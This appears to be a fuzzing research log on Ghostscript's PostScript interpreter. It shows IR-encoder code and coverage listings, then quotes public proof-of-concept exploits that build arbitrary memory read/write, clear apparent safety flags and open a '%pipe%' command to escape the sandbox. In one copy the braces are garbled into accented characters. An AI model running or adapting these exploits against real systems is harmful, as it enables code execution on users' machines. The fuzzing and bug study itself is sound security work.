                                        elif k2 == 'STRING':
                                                out += bytes([IR.I_STRING]) + pack_allowed(v2[1:-1].encode('latin1'))
                                        # (ignore nested arrays/procs here for brevity; could recurse)
                                out += bytes([IR.ARR_E])
                        elif kind == 'PROC':
                                out += bytes([IR.PROC_S])
                                inner = val[1:-1]
                                # recursively encode body as a sequence of tokens
                                for k2, v2 in _tokenize_expr(inner):
                                        if k2 == 'NUM':
                                                if '.' in v2:
                                                        try:
                                                                a,b = v2.split('.',1); a=int(a or '0'); b=int(''.join(ch for ch in b if ch.isdigit()) or '0')
                                                        except Exception:
                                                                a,b = 0,0
                                                        u = ((a & 0xFFFF) << 16) | (b & 0xFFFF)
                                                        out += bytes([IR.I_REAL32]) + IR.varint_encode(IR.zz_encode(u))
                                                else:
                                                        out += bytes([IR.I_INT]) + IR.varint_encode(IR.zz_encode(int(v2)))
                                        elif k2 == 'LNAME':
                                                defined_vars.append('/' + v2)
                                                out += bytes([IR.I_LNAME]) + pack_allowed(v2.encode('latin1'))
                                        elif k2 == 'ENAME':
                                                out += _emit_name(v2, defined_vars)
                                        elif k2 == 'STRING':
                                                out += bytes([IR.I_STRING]) + pack_allowed(v2[1:-1].encode('latin1'))
                                out += bytes([IR.PROC_E])
                        else:
                                # ignore unknowns
                                pass
                out += bytes([IR.END_EXPR])
        return bytes(out)

import sys

def test():
        if len(sys.argv) != 2:
                ps = r"""/boxsize
                  inwidth inheight gt
                  { pagewidth inwidth truncate 1 .max div }
                  { pageheight inheight truncate 1 .max div }
                  ifelse
                def
                1 1 add
                """
        else:
                fh = open(sys.argv[1], "r")
                ps = fh.read()
                fh.close()

        blob = ps_to_ir(ps)
        fh = open("output.bin", "wb")
        fh.write(blob)
        fh.close()
        print(IR.ir_to_postscript(blob).decode('latin1'))

if __name__=="__main__":
        test()
        exit(0)
```

## Iterating over the coverage and making further improvements.

Ok, so my fuzzer only found false positives so far, so it is time to make some improvements to my fuzzing setup for now...

Here is my current coverage for the psi directory:

PUT IMAGE HERE

So it looks like we need to improve our fuzzer and the corpus a bit maybe? There are the func0.c func1.c func2.c func3.c and func4.c files which are basically supposed to be used with the .buildfunction call which is private and which we can not do normally. I actually modified my fuzzer such that it uses a gs_init.ps which allows the use of those functions.

Also there is the calls to this here:

```

  112              : /* <width> <height> <data> .imagepath - */
     113              : static int
     114           10 : zimagepath(i_ctx_t *i_ctx_p)
     115              : {
     116           10 :     os_ptr op = osp;
     117           10 :     int code;
     118              :
     119           10 :     check_op(3);
     120            2 :     check_type(op[-2], t_integer);
     121            0 :     check_type(op[-1], t_integer);
     122            0 :     check_read_type(*op, t_string);
     123            0 :     if (r_size(op) < ((op[-2].value.intval + 7) >> 3) * op[-1].value.intval)
     124              :         return_error(gs_error_rangecheck);
     125            0 :     code = gs_imagepath(igs,
     126              :                         (int)op[-2].value.intval, (int)op[-1].value.intval,
     127              :                         op->value.const_bytes);
     128            0 :     if (code >= 0)
     129            0 :         pop(3);
     130              :     return code;
     131              : }

```

which take in raw data and then makes a path out of them. This seems interesting, but no such cases were ever found. This is the only place in the entire codebase where the gs_imagepath is supposed to be called... There is also string continuation thing here:

```
    453            0 :         case t_string:
     454            0 :             check_read(*obj);
     455            0 :             make_op_estack(cproc, string_continue);
     456            0 :             break;
```

which was never hit. So maybe make a case for that too?




## Inspecting the coverage findings

So here is a list of stuff that we need to implement for better fuzzing:

```
/* <width> <height> <data> .imagepath - */ for .imagepath data parsing...




Call for zbsobject:


   121              : static int
     122           14 : zbosobject(i_ctx_t *i_ctx_p)
     123              : {
     124           14 :     os_ptr op = osp;
     125           14 :     int code;
     126              :
     127           14 :     check_op(4);
     128            4 :     check_type(op[-3], t_integer);
     129            4 :     check_type(op[-2], t_integer);
     130            0 :     check_write_type(*op, t_string);
     131            0 :     if (r_size(op) < 8)
     132              :         return_error(gs_error_rangecheck);
     133            0 :     code = encode_binary_token(i_ctx_p, op - 1, &op[-3].value.intval,
     134              :                                &op[-2].value.intval, op->value.bytes);
     135            0 :     if (code < 0)
     136              :         return code;
     137            0 :     op[-1] = *op;
     138            0 :     r_set_size(op - 1, 8);
     139            0 :     pop(1);
     140            0 :     return 0;
     141              : }
     142              :
     143              : /* ------ Initialization procedure ------ */
     144              :
     145              : const op_def zbseq_l2_op_defs[] =
     146              : {
     147              :     op_def_begin_level2(),
     148              :     {"1.installsystemnames", zinstallsystemnames},
     149              :     {"0currentobjectformat", zcurrentobjectformat},
     150              :     {"1setobjectformat", zsetobjectformat},
     151              :     {"4.bosobject", zbosobject},
     152              :     op_def_end(zbseq_init)
     153              : };



Stroke over print:

      88              : /* <bool> setstrokeoverprint - */
      89              : static int
      90            0 : zsetstrokeoverprint(i_ctx_t *i_ctx_p)
      91              : {
      92            0 :     os_ptr op = osp;
      93              :
      94            0 :     check_op(1);
      95            0 :     check_type(*op, t_boolean);
      96            0 :     gs_setstrokeoverprint(igs, op->value.boolval);
      97            0 :     pop(1);
      98            0 :     return 0;
      99              : }

this here:

    112              : /* <bool> setfilloverprint - */
     113              : static int
     114          178 : zsetfilloverprint(i_ctx_t *i_ctx_p)
     115              : {
     116          178 :     os_ptr op = osp;
     117              :
     118          178 :     check_op(1);
     119          176 :     check_type(*op, t_boolean);
     120            0 :     gs_setfilloverprint(igs, op->value.boolval);
     121            0 :     pop(1);
     122            0 :     return 0;
     123              : }

    244              : /* <bool1> <bool2> xor <bool> */
     245              : /* <int1> <int2> xor <int> */
     246              : int
     247            6 : zxor(i_ctx_t *i_ctx_p)
     248              : {
     249            6 :     os_ptr op = osp;
     250              :
     251            6 :     check_op(2);
     252            0 :     switch (r_type(op)) {
     253            0 :         case t_boolean:
     254            0 :             check_type(op[-1], t_boolean);
     255            0 :             op[-1].value.boolval ^= op->value.boolval;
     256            0 :             break;
     257            0 :         case t_integer:
     258            0 :             check_type(op[-1], t_integer);
     259            0 :             op[-1].value.intval ^= op->value.intval;
     260            0 :             break;
     261            0 :         default:
     262            0 :             return_op_typecheck(op);
     263              :     }
     264            0 :     pop(1);
     265            0 :     return 0;
     266              : }


    308              : /* <obj1> <obj2> .identeq <bool> */
     309              : static int
     310            0 : zidenteq(i_ctx_t *i_ctx_p)
     311              : {
     312            0 :     os_ptr op = osp;
     313              :
     314            0 :     check_op(2);
     315            0 :     EQ_CHECK_READ(op - 1, check_op(2));
     316            0 :     EQ_CHECK_READ(op, DO_NOTHING);
     317            0 :     make_bool(op - 1, (obj_ident_eq(imemory, op - 1, op) ? 1 : 0));
     318            0 :     pop(1);
     319            0 :     return 0;
     320              :
     321              : }
     322              :
     323              : /* <obj1> <obj2> .identne <bool> */
     324              : static int
     325            0 : zidentne(i_ctx_t *i_ctx_p)
     326              : {
     327              :         /* We'll just be lazy and use .identeq. */
     328            0 :     os_ptr op = osp;
     329            0 :     int code;
     330              :
     331            0 :     check_op(1);
     332            0 :     code = zidenteq(i_ctx_p);
     333            0 :     if (!code)
     334            0 :         osp->value.boolval ^= 1;
     335              :     return code;
     336              : }

    415              : /* There are a few cases where a customer/user might want CPSI behavior
     416              :  * instead of the GS default behavior. cmyk_to_rgb and Type 1 char fill
     417              :  * method are two that have come up so far. This operator allows a PS
     418              :  * program to control the behavior without needing to recompile.
     419              :  */
     420              : /* <bool> .setCPSImode - */
     421              : static int
     422            0 : zsetCPSImode(i_ctx_t *i_ctx_p)
     423              : {
     424            0 :     os_ptr op = osp;
     425            0 :     check_op(1);
     426            0 :     check_type(*op, t_boolean);
     427            0 :     gs_setcpsimode(imemory, op->value.boolval);
     428            0 :     if (op->value.boolval) {
     429            0 :         i_ctx_p->scanner_options |= SCAN_CPSI_MODE;
     430              :     }
     431              :     else {
     432            0 :         i_ctx_p->scanner_options &= ~(int)SCAN_CPSI_MODE;
     433              :     }
     434            0 :     pop(1);
     435            0 :     return 0;
     436              : }
     437              :
     438              : /* - .getCPSImode <bool> */
     439              : static int
     440            0 : zgetCPSImode(i_ctx_t *i_ctx_p)
     441              : {
     442            0 :     os_ptr op = osp;
     443              :
     444            0 :     push(1);
     445            0 :     make_bool(op, gs_currentcpsimode(imemory));
     446            0 :     return 0;
     447              : }
We are also missing the case where we are calling token on a raw string: /* <string|file> token -false- */







We also have this here:



  370              : /* <num> <radix_int> <string> cvrs <substring> */
     371              : static int
     372            2 : zcvrs(i_ctx_t *i_ctx_p)
     373              : {
     374            2 :     os_ptr op = osp;
     375            2 :     int radix;
     376              :
     377            2 :     check_op(2);
     378            0 :     check_type(op[-1], t_integer);
     379            0 :     if (op[-1].value.intval < 2 || op[-1].value.intval > 36)
     380              :         return_error(gs_error_rangecheck);
     381            0 :     radix = op[-1].value.intval;
     382            0 :     check_write_type(*op, t_string);
     383            0 :     if (radix == 10) {
     384            0 :         switch (r_type(op - 2)) {
     385            0 :             case t_integer:
     386              :             case t_real:
     387              :                 {
     388            0 :                     int code = convert_to_string(imemory, op - 2, op);
     389              :
     390            0 :                     if (code < 0)
     391              :                         return code;
     392            0 :                     pop(2);
     393            0 :                     return 0;
     394              :                 }
     395              :             case t__invalid:
     396              :                 return_error(gs_error_stackunderflow);
     397            0 :             default:
     398            0 :                 return_error(gs_error_rangecheck); /* CET 24-05 wants rangecheck */
     399              :         }
     400              :     } else {
     401            0 :         ps_uint ival;
     402            0 :         byte digits[sizeof(ulong) * 8];
     403            0 :         byte *endp = &digits[countof(digits)];
     404            0 :         byte *dp = endp;
     405              :
     406            0 :         switch (r_type(op - 2)) {
     407            0 :             case t_integer:
     408            0 :                 ival = (ps_uint) op[-2].value.intval;
     409            0 :                 break;
     410            0 :             case t_real:
     411              :                 {
     412            0 :                     float fval = op[-2].value.realval;
     413              :
     414            0 :                     if (!REAL_CAN_BE_INT(fval))
     415            0 :                         return_error(gs_error_rangecheck);
     416            0 :                     ival = (ps_uint)fval;
     417            0 :                     if (sizeof(ps_int) != 4 && gs_currentcpsimode(imemory)) {
     418            0 :                         if ((double)fval > (double)MAX_PS_INT32)       /* (double)0x7fffffff */
     419              :                             return_error(gs_error_rangecheck);
     420            0 :                         else if ((double)fval < (double)MIN_PS_INT32) /* (double)(int)0x80000000 */
     421              :                             return_error(gs_error_rangecheck);
     422              :                     }
     423              :                 } break;
     424              :             case t__invalid:
     425              :                 return_error(gs_error_stackunderflow);
     426              :             default:
     427              :                 return_error(gs_error_rangecheck); /* CET 24-05 wants rangecheck */
     428              :         }
     429            0 :         if (gs_currentcpsimode(imemory)) {
     430            0 :             uint val = (uint)ival;
     431            0 :             do {
     432            0 :                 int dit = val % radix;
     433              :
     434            0 :                 *--dp = dit + (dit < 10 ? '0' : ('A' - 10));
     435            0 :                 val /= radix;
     436              :             }
     437            0 :             while (val);
     438              :
     439              :         } else {
     440            0 :             do {
     441            0 :                 int dit = ival % radix;
     442              :
     443            0 :                 *--dp = dit + (dit < 10 ? '0' : ('A' - 10));
     444            0 :                 ival /= radix;
     445              :             }
     446            0 :             while (ival);
     447              :         }
     448            0 :         if (endp - dp > r_size(op))
     449              :             return_error(gs_error_rangecheck);
     450            0 :         memcpy(op->value.bytes, dp, (uint) (endp - dp));
     451            0 :         r_set_size(op, endp - dp);
     452              :     }
     453            0 :     op[-2] = *op;
     454            0 :     pop(2);
     455            0 :     return 0;
     456              : }


  433              : /* ------ Graphics state ------ */
     434              :
     435              : /* <llx> <lly> <urx> <ury> setbbox - */
     436              : int
     437           12 : zsetbbox(i_ctx_t *i_ctx_p)
     438              : {
     439           12 :     os_ptr op = osp;
     440           12 :     double box[4];
     441           12 :     int code;
     442              :
     443           12 :     check_op(4);
     444            2 :     code = num_params(op, 4, box);
     445              :
     446            2 :     if (code < 0)
     447              :         return code;
     448            0 :     if ((code = gs_setbbox(igs, box[0], box[1], box[2], box[3])) < 0)
     449              :         return code;
     450            0 :     pop(4);
     451            0 :     return 0;
     452              : }






   419              : /* <matrix> <width> <height> <palette> <word?> makewordimagedevice <device> */
     420              : static int
     421            4 : zmakewordimagedevice(i_ctx_t *i_ctx_p)
     422              : {
     423            4 :     os_ptr op = osp;
     424            4 :     os_ptr op1 = op - 1;
     425            4 :     gs_matrix imat;
     426            4 :     gx_device *new_dev;
     427            4 :     const byte *colors;
     428            4 :     int colors_size;
     429            4 :     int code;
     430            4 :     psi_device_ref *psdev;
     431              :
     432            4 :     check_op(5);
     433            0 :     check_int_leu(op[-3], max_uint >> 1); /* width */
     434            0 :     check_int_leu(op[-2], max_uint >> 1); /* height */
     435            0 :     check_type(*op, t_boolean);



    117              : /* <redproc> <greenproc> <blueproc> <grayproc> setcolortransfer - */
     118              : static int
     119           14 : zsetcolortransfer(i_ctx_t *i_ctx_p)
     120              : {
     121           14 :     os_ptr op = osp;
     122           14 :     os_ptr ep = esp;
     123           14 :     int code;
     124           14 :     gx_transfer txfer, txfer1;
     125              :
     126           14 :     check_op(4);
     127            0 :     check_proc(op[-3]);
     128            0 :     check_proc(op[-2]);
     129            0 :     check_proc(op[-1]);
     130            0 :     check_proc(*op);
     131            0 :     check_ostack(zcolor_remap_one_ostack * 4 - 4);
     132            0 :     check_estack(1 + zcolor_remap_one_estack * 4);
     133              :







      86              : /* <string> <numarray|numstring> xshow - */
      87              : /* <string> <numarray|numstring> yshow - */
      88              : /* <string> <numarray|numstring> xyshow - */
      89              : static int
      90           36 : moveshow(i_ctx_t *i_ctx_p, bool have_x, bool have_y)
      91              : {
      92           36 :     os_ptr op = osp;
      93           36 :     gs_text_enum_t *penum = NULL;
      94           36 :     int code;
      95           36 :     int format;
      96           36 :     uint i, size, widths_needed;
      97           36 :     float *values;
      98           36 :     bool CPSI_mode = gs_currentcpsimode(imemory);
      99              :
     100           36 :     check_op(2);
     101           14 :     code = op_show_setup(i_ctx_p, op - 1);
     102           14 :     if (code != 0)
     103              :         return code;
     104            4 :     format = num_array_format(op);
     105            4 :     if (format < 0)
     106              :         return format;
     107            0 :     size = num_array_size(op, format);
     108            0 :     values = (float *)ialloc_byte_array(size, sizeof(float), "moveshow");
     109            0 :     if (values == 0)
     110              :         return_error(gs_error_VMerror);
     111            0 :     if (CPSI_mode)
     112            0 :         memset(values, 0, size * sizeof(values[0])); /* Safety. */
     113            0 :     if ((code = gs_xyshow_begin(igs, op[-1].value.bytes, r_size(op - 1),
     114              :                                 (have_x ? values : (float *)0),
     115              :                                 (have_y ? values : (float *)0),
     116            0 :                                 size, imemory_local, &penum)) < 0) {
     117            0 :         ifree_object(values, "moveshow");








All of the filters are completely missing:

     34              : /* <source> ASCIIHexEncode/filter <file> */
      35              : /* <source> <dict> ASCIIHexEncode/filter <file> */
      36              : static int
      37            0 : zAXE(i_ctx_t *i_ctx_p)
      38              : {
      39            0 :     return filter_write_simple(i_ctx_p, &s_AXE_template);
      40              : }
      41              :
      42              : /* <target> ASCIIHexDecode/filter <file> */
      43              : /* <target> <dict> ASCIIHexDecode/filter <file> */
      44              : static int
      45            0 : zAXD(i_ctx_t *i_ctx_p)
      46              : {
      47            0 :     return filter_read_simple(i_ctx_p, &s_AXD_template);
      48              : }
      49              :
      50              : /* <target> NullEncode/filter <file> */
      51              : /* <target> <dict_ignored> NullEncode/filter <file> */
      52              : static int
      53            0 : zNullE(i_ctx_t *i_ctx_p)
      54              : {
      55            0 :     return filter_write_simple(i_ctx_p, &s_NullE_template);
      56              : }
      57              :
      58              : /* <source> <bool> PFBDecode/filter <file> */
      59              : /* <source> <dict> <bool> PFBDecode/filter <file> */
      60              : static int
      61            0 : zPFBD(i_ctx_t *i_ctx_p)
      62              : {
      63            0 :     os_ptr sop = osp;
      64            0 :     stream_PFBD_state state;
      65              :
      66            0 :     check_type(*sop, t_boolean);
      67            0 :     state.binary_to_hex = sop->value.boolval;
      68            0 :     return filter_read(i_ctx_p, 1, &s_PFBD_template, (stream_state *)&state, 0);
      69              : }
      70              :
      71              : /* ------ RunLength filters ------ */
      72              :
      73              : /* Common setup for RLE and RLD filters. */
      74              : static int
      75            0 : rl_setup(os_ptr dop, bool * eod)
      76              : {
      77            0 :     if (r_has_type(dop, t_dictionary)) {
      78            0 :         int code;
      79              :
      80            0 :         check_dict_read(*dop);
      81            0 :         if ((code = dict_bool_param(dop, "EndOfData", true, eod)) < 0)
      82              :             return code;
      83            0 :         return 1;
      84              :     } else {
      85            0 :         *eod = true;
      86            0 :         return 0;
      87              :     }
      88              : }
      89              :
      90              : /* <target> <record_size> RunLengthEncode/filter <file> */
      91              : /* <target> <dict> <record_size> RunLengthEncode/filter <file> */
      92              : static int
      93            0 : zRLE(i_ctx_t *i_ctx_p)
      94              : {
      95            0 :     os_ptr op = osp;
      96            0 :     stream_RLE_state state;
      97            0 :     int code;
      98              :
      99            0 :     s_RLE_template.set_defaults((stream_state *)&state);
     100            0 :     check_op(2);
     101            0 :     code = rl_setup(op - 1, &state.EndOfData);
     102            0 :     if (code < 0)
     103              :         return code;
     104            0 :     check_int_leu(*op, max_uint);
     105            0 :     state.record_size = op->value.intval;
     106            0 :     return filter_write(i_ctx_p, 1, &s_RLE_template, (stream_state *) & state, 0);
     107              : }
     108              :
     109              : /* <source> RunLengthDecode/filter <file> */
     110              : /* <source> <dict> RunLengthDecode/filter <file> */
     111              : static int
     112            0 : zRLD(i_ctx_t *i_ctx_p)
     113              : {
     114            0 :     os_ptr op = osp;
     115            0 :     stream_RLD_state state;
     116            0 :     int code = rl_setup(op, &state.EndOfData);
     117              :
     118            0 :     if (code < 0)
     119              :         return code;
     120            0 :     return filter_read(i_ctx_p, 0, &s_RLD_template, (stream_state *) & state, 0);
     121              : }


soo that sucks...


Also all of the stuff related to user strokes have bad coverage:

   350              : /* <userpath> uappend - */
     351              : static int
     352            4 : zuappend(i_ctx_t *i_ctx_p)
     353              : {
     354            4 :     os_ptr op = osp;
     355            4 :     int code = gs_gsave(igs);
     356              :
     357            4 :     if (code < 0)
     358              :         return code;
     359            4 :     if ((code = upath_append(op, i_ctx_p, false)) >= 0)
     360            0 :         code = gs_upmergepath(igs);
     361            4 :     gs_grestore(igs);
     362            4 :     if (code < 0)
     363              :         return code;
     364            0 :     pop(1);
     365            0 :     return 0;
     366              : }
     367              :
     368              : /* <userpath> ueofill - */
     369              : static int
     370            4 : zueofill(i_ctx_t *i_ctx_p)
     371              : {
     372            4 :     os_ptr op = osp;
     373            4 :     int code = gs_gsave(igs);
     374              :
     375            4 :     if (code < 0)
     376              :         return code;
     377            4 :     if ((code = upath_append(op, i_ctx_p, gs_currentcpsimode(imemory))) >= 0)
     378            0 :         code = gs_eofill(igs);
     379            4 :     gs_grestore(igs);
     380            4 :     if (code < 0)
     381              :         return code;
     382            0 :     pop(1);
     383            0 :     return 0;
     384              : }
     385              :
     386              : /* <userpath> ufill - */
     387              : static int
     388           38 : zufill(i_ctx_t *i_ctx_p)
     389              : {
     390           38 :     os_ptr op = osp;
     391           38 :     int code = gs_gsave(igs);
     392              :
     393           38 :     if (code < 0)
     394              :         return code;
     395           38 :     if ((code = upath_append(op, i_ctx_p, gs_currentcpsimode(imemory))) >= 0)
     396            0 :         code = gs_fill(igs);
     397           38 :     gs_grestore(igs);
     398           38 :     if (code < 0)
     399              :         return code;
     400            0 :     pop(1);
     401            0 :     return 0;
     402              : }
     403              :
     404              : /* <userpath> ustroke - */
     405              : /* <userpath> <matrix> ustroke - */
     406              : static int
     407            0 : zustroke(i_ctx_t *i_ctx_p)
     408              : {
     409            0 :     int code = gs_gsave(igs);
     410            0 :     int npop;
     411              :
     412            0 :     if (code < 0)
     413              :         return code;
     414            0 :     if ((code = npop = upath_stroke(i_ctx_p, NULL, gs_currentcpsimode(imemory))) >= 0)
     415            0 :         code = gs_stroke(igs);
     416            0 :     gs_grestore(igs);
     417            0 :     if (code < 0)
     418              :         return code;
     419            0 :     pop(npop);
     420            0 :     return 0;
     421              : }




and also this here:

  108              : /* <x> <y> <userpath> inustroke <bool> */
     109              : /* <x> <y> <userpath> <matrix> inustroke <bool> */
     110              : /* <userpath1> <userpath2> inustroke <bool> */
     111              : /* <userpath1> <userpath2> <matrix> inustroke <bool> */
     112              : static int
     113           10 : zinustroke(i_ctx_t *i_ctx_p)
     114              : {       /* This is different because of the optional matrix operand. */
     115           10 :     os_ptr op = osp;
     116           10 :     int code = gs_gsave(igs);
     117           10 :     int spop, npop;
     118           10 :     gs_matrix mat;
     119           10 :     gx_device hdev;
     120              :
     121           10 :     if (code < 0)
     122              :         return code;
     123           10 :     if ((spop = upath_stroke(i_ctx_p, &mat, false)) < 0) {
     124           10 :         gs_grestore(igs);
     125           10 :         return spop;
     126              :     }
     127            0 :     if ((npop = in_path(op - spop, i_ctx_p, &hdev)) < 0) {
     128            0 :         gs_grestore(igs);
     129            0 :         return npop;
     130              :     }
     131            0 :     if (npop > 1)            /* matrix was supplied */
     132            0 :         code = gs_concat(igs, &mat);
     133            0 :     if (code >= 0) {
     134            0 :         dev_proc(&hdev, set_graphics_type_tag)(&hdev, GS_VECTOR_TAG);   /* so that fills don't unset dev_color */
     135            0 :         code = gs_stroke(igs);
     136              :     }
     137            0 :     return in_upath_result(i_ctx_p, npop + spop, code);
     138              : }
     139              :

they are in the zupath.c file...


this private stuff here:

   425              : /* See comments at start of module for description. */
     426              : /* <dict> <string> .parse_dsc_comments <dict> <dsc code> */
     427              : static int
     428            4 : zparse_dsc_comments(i_ctx_t *i_ctx_p)
     429              : {
     430              : #define MAX_DSC_MSG_SIZE (DSC_LINE_LENGTH + 4)  /* Allow for %% and CR/LF */
     431            4 :     os_ptr op = osp;
     432            4 :     os_ptr const opString = op;
     433            4 :     os_ptr const opDict = opString - 1;
     434            4 :     uint ssize;
     435            4 :     int comment_code, code;
     436            4 :     char dsc_buffer[MAX_DSC_MSG_SIZE + 2];
     437            4 :     const cmdlist_t *pCmdList = DSCcmdlist;
     438            4 :     const char * const *pBadList = BadCmdlist;
     439            4 :     ref * pvalue;
     440            4 :     dsc_data_t * dsc_state = NULL;
     441            4 :     dict_param_list list;
     442              :
     443            4 :     check_op(2);
     444              :     /*
     445              :      * Verify operand types and length of DSC comment string.  If a comment
     446              :      * is too long then we simply truncate it.  Russell's parser gets to
     447              :      * handle any errors that may result.  (Crude handling but the comment
     448              :      * is bad, so ...).
     449              :      */
     450            0 :     check_type(*opString, t_string);
     451            0 :     check_type(*opDict, t_dictionary);
     452            0 :     check_dict_write(*opDict);
     453            0 :     ssize = r_size(opString);
     454            0 :     if (ssize > MAX_DSC_MSG_SIZE)   /* need room for EOL + \0 */
     455              :         ssize = MAX_DSC_MSG_SIZE;
     456              :     /*

also has poor coverage



the zcolor.c file is over 3k lines, but since it mainly deals with the colorspace stuff, I don't really think it is worth it to go over it.



```

## Looking at existing POC files.

Ok, so I think that I should download some existing poc files from known bugs. Here: https://bugs.ghostscript.com/buglist.cgi?bug_status=RESOLVED&component=Security%20%28public%29&list_id=105736&product=Ghostscript&query_format=advanced&resolution=FIXED

so let's download one of them and see if it does anything...

Here is one poc file for a certain bug:

```
% gs -q -sDEVICE=txtwrite -sOutputFile=/dev/null textbuffer.ps

500000000 setvmthreshold

/REFIDX 62421 def
/REFOFS 5999992 def

/STROBJ 1000 string def
/ARROBJ 6250 array def
/OBJARR 32 array def
OBJARR 0 STROBJ put
OBJARR 1 ARROBJ put
/PADDING null def
/TARGET null def

/MAGIC null def
/STRPTR null def
/ARRPTR null def

% <dststr> <dstidx> <srcstr> <srcidx> <length> copystr -
/copystr æ
    /_length exch def
    /_srcidx exch def
    /_srcstr exch def
    /_dstidx exch def
    /_dststr exch def
    _length æ
        _dststr _dstidx _srcstr _srcidx get put
        /_srcidx _srcidx 1 add def
        /_dstidx _dstidx 1 add def
    å repeat
å bind def

% <string> <int> ptradd <string>
/ptradd æ
    /_inc exch def
    /_ptr exch def
    /_new 8 string def
    0 1 7 æ
        /_i exch def
        /_b _ptr _i get _inc add def
        /_inc _b -8 bitshift def
        _new _i _b 255 and put
    å for
    _new
å bind def

% <string-address> <string-buffer> arbrd -
/arbrd æ
    /_buf exch def
    /_adr exch def
    STRPTR 0 _adr 0 8 copystr
    _buf 0 OBJARR 0 get 0 _buf length copystr
å bind def

% <string-address> <string-data> arbwr -
/arbwr æ
    /_buf exch def
    /_adr exch def
    STRPTR 0 _adr 0 8 copystr
    OBJARR 0 get 0 _buf 0 _buf length copystr
å bind def

/DONE æ
    /MAGIC TARGET REFIDX get def
    /STRPTR MAGIC 8 8 getinterval def
    /ARRPTR MAGIC 24 8 getinterval def

    (patch) = flush

    /arrptr 8 string def
    arrptr 0 ARRPTR 0 8 copystr

    æ
        /arrsz 8 string def

        /next arrptr -40 ptradd -48 ptradd def
        next 16 ptradd arrsz arbrd
        arrsz <d886010000000000> eq æ exit å if % 100056

        /next arrptr -56 ptradd -48 ptradd def
        next 16 ptradd arrsz arbrd
        arrsz <e886010000000000> eq æ exit å if % 100072

        (unknown header layout) = quit
    å loop

    æ
        /head next def

        /next 8 string def
        /cname 8 string def
        /cname_str 21 string def

        head next arbrd
        head 32 ptradd cname arbrd
        cname cname_str arbrd

        cname_str (gs_lib_ctx_init(core)) eq æ exit å if
    å loop

    /buf 4 string def
    /ptr1 head 188 ptradd def
    /ptr2 head 204 ptradd def
    ptr1 buf arbrd buf <01000000> eq æ ptr1 <00000000> arbwr å if
    ptr2 buf arbrd buf <01000000> eq æ ptr2 <00000000> arbwr å if

    (exec) = flush
    (%pipe%id) (w) file

    (done) =
    æ 1 pop å loop

    quit
å def  % DONE

/MAIN æ

/Myfont
<<
    /FontName /Myfont
    /FontType 1
    /FontMatrix Æ1 0 0 1 0 0Å
    /Private << /lenIV -1 /Subrs Æ <0E> Å >>
    /Decoding 0
    /Encoding Æ /cs0 /cs1 /cs2 Å
    /CharStrings <<
        /.notdef <0E>
        /cs0 æ TEXT 0 1 put /PADDING 437500 array def å
        /cs1 <0E>
        /cs2 æ DONE å
    >>
    /WeightVector Æ1Å
    /$Blend æå
    /FontInfo <<
        /BlendAxisTypes Æ /foo Å
        /BlendDesignPositions ÆÆ1ÅÅ
        /BlendDesignMap ÆÆÆ1ÅÅÅ
        /GlyphNames2Unicode << >>
    >>
    /Blend <<
        /FontBBox ÆÆ1ÅÅ
        /Private << >>
    >>
>>
.buildfont1
/FONT exch def
/FONTNAME exch def

FONT setfont

(init) = flush

/TEXT 625000 string def
/SOURCE2 6000000 string def
/SOURCE1 5999994 string def
SOURCE1 5999992 <127e> putinterval
/TARGET 312500 array def
TARGET REFIDX OBJARR put

FONT /FontInfo get /GlyphNames2Unicode get 1 SOURCE1 put
FONT /CharStrings get /.notdef undef
TEXT 0 0 put
TEXT 1 2 put

(trigger) = flush

0 750 moveto
TEXT show

å def  % MAIN

MAIN
quit
```

let's run it through our ir generator and then seeing if the call to .buildfont1 actually happens...

Here is the generated from ir and the original version side by side:

```

oof@elskun-lppri:~/newghost/ghostpdl$ cat poc.ps
500000000
/REFIDX 249888 def
/REFOFS 3248640 def
/STROBJ 1000 string def
/ARROBJ 6250 array def
/OBJARR 32 array def
OBJARR 0 STROBJ put
OBJARR 1 ARROBJ put
/TARGET def
/MAGIC def
/STRPTR def
/ARRPTR def
/copystr { /Alength exch def /Asrcidx exch def /Asrcstr exch def /Adstidx exch def /Adststr exch def Alength repeat} bind def
/ptradd { /Ainc exch def /Aptr exch def /Anew 8 string def 0 1 7 for Anew} bind def
/arbrd { /Abuf exch def /Aadr exch def STRPTR 0 Aadr 0 8 copystr Abuf 0 OBJARR 0 get 0 Abuf length copystr} bind def
/arbwr { /Abuf exch def /Aadr exch def STRPTR 0 Aadr 0 8 copystr OBJARR 0 get 0 Abuf 0 Abuf length copystr} bind def
/DONE { /MAGIC TARGET REFIDX get def /STRPTR MAGIC 8 8 getinterval def /ARRPTR MAGIC 24 8 getinterval def (patch) flush /arrptr 8 string def arrptr 0 ARRPTR 0 8 copystr /buf 4 string def /ptrA 188 ptradd def /ptrA 204 ptradd def ptrA buf arbrd buf eq if ptrA buf arbrd buf eq if (exec) flush (ApipeAid) (w) file (done)} def
/MAIN { /Myfont .buildfont1 /FONT exch def /FONTNAME exch def FONT setfont (init) flush /TEXT 625000 string def /SOURCEA 4000002 string def /SOURCEA 4000002 string def SOURCEA REFOFS putinterval FONT /FontInfo get /GlyphNamesAUnicode get 1 SOURCEA put FONT /CharStrings get /Anotdef undef TEXT 0 0 put TEXT 1 2 put (trigger) flush 0 750 moveto TEXT show} def
MAIN
oof@elskun-lppri:~/newghost/ghostpdl$ cat glyphunicode.ps
% gs -q -sDEVICE=txtwrite -sOutputFile=/dev/null glyphunicode.ps

500000000 setvmthreshold

/REFIDX 249888 def
/REFOFS 3248640 def

/STROBJ 1000 string def
/ARROBJ 6250 array def
/OBJARR 32 array def
OBJARR 0 STROBJ put
OBJARR 1 ARROBJ put
/TARGET null def

/MAGIC null def
/STRPTR null def
/ARRPTR null def

% <dststr> <dstidx> <srcstr> <srcidx> <length> copystr -
/copystr {
    /_length exch def
    /_srcidx exch def
    /_srcstr exch def
    /_dstidx exch def
    /_dststr exch def
    _length {
        _dststr _dstidx _srcstr _srcidx get put
        /_srcidx _srcidx 1 add def
        /_dstidx _dstidx 1 add def
    } repeat
} bind def

% <string> <int> ptradd <string>
/ptradd {
    /_inc exch def
    /_ptr exch def
    /_new 8 string def
    0 1 7 {
        /_i exch def
        /_b _ptr _i get _inc add def
        /_inc _b -8 bitshift def
        _new _i _b 255 and put
    } for
    _new
} bind def

% <string-address> <string-buffer> arbrd -
/arbrd {
    /_buf exch def
    /_adr exch def
    STRPTR 0 _adr 0 8 copystr
    _buf 0 OBJARR 0 get 0 _buf length copystr
} bind def

% <string-address> <string-data> arbwr -
/arbwr {
    /_buf exch def
    /_adr exch def
    STRPTR 0 _adr 0 8 copystr
    OBJARR 0 get 0 _buf 0 _buf length copystr
} bind def

/DONE {
    /MAGIC TARGET REFIDX get def
